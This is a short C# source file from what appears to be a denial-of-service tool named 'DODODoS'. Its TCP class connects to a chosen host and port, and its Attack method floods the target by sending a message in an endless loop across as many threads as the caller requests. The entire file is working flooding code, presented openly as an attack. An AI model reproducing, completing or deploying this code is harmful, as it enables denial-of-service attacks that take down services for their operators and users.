using System;
using System.Threading;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;

namespace DODODoS
{
    public class TCP
    {
        TcpClient client;

        public TCP()
        {
            client = new TcpClient();
        }

        public bool Connect(string host, int port)
        {
            try
            {
                client.Connect(host, port);
                return true;
            }
            catch (SocketException e)
            {
                return false;
            }
        }

        public bool Attack(byte[] message, int thread)
        {
            //      Simple recursive method. If the thread variable is set to 1 then it starts the attack, Otherwise it runs as much threads as indicated in the thread var
            if (thread == 1)
                while (true)
                    try
                    {
                        client.Client.Send(message);
                    }
                    catch (SocketException e)
                    {
                        return false;
                    }
            else
                for (int i = 0; i < thread; i++)
                    new Thread(() => Attack(message, 1)).Start();
            return true;
        }
    }
}
